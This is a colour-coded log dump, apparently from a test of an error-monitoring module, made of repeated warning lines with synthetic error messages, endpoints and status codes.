WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.753322Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m26[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1258'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_58[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m458[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.753371Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m26[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1259'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_59[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m459[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.753420Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m26[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1260'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_60[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m460[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.753469Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m26[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1261'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_61[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m461[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.753518Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m26[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1262'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_62[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m462[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.753566Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m26[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1263'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_63[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m463[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.753614Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m26[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1264'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_64[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m464[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.753663Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m26[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1265'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_65[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m465[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.753712Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m26[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1266'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_66[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m466[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.753762Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m26[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1267'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_67[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m467[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.753811Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m26[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1268'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_68[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m468[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.753861Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m26[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1269'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_69[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m469[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.753914Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m26[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1270'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_70[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m470[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.753962Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m26[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1271'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_71[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m471[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.754010Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m26[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1272'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_72[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m472[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.754059Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m26[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1273'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_73[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m473[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.754107Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m26[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1274'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_74[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m474[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.754155Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m26[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1275'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_75[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m475[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.754215Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m26[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1276'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_76[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m476[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.754269Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m26[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1277'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_77[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m477[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.754323Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m26[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1278'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_78[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m478[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.754375Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m26[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1279'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_79[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m479[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.754424Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m26[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1280'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_80[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m480[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.754473Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m26[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1281'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_81[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m481[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.754521Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m26[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1282'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_82[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m482[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.754614Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m26[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1283'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_83[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m483[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.754687Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m26[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1284'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_84[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m484[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.754743Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m26[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1285'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_85[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m485[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.754842Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m26[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1286'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_86[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m486[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.754911Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m26[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1287'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_87[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m487[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.754966Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m26[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1288'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_88[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m488[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.755022Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m26[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1289'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_89[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m489[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.755073Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m26[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1290'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_90[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m490[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.755123Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m26[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1291'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_91[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m491[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.755172Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m26[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1292'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_92[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m492[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.755220Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m26[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1293'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_93[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m493[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.755270Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m26[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1294'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_94[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m494[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.755322Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m26[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1295'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_95[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m495[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.755371Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m26[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1296'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_96[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m496[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.755420Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m26[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1297'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_97[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m497[0m
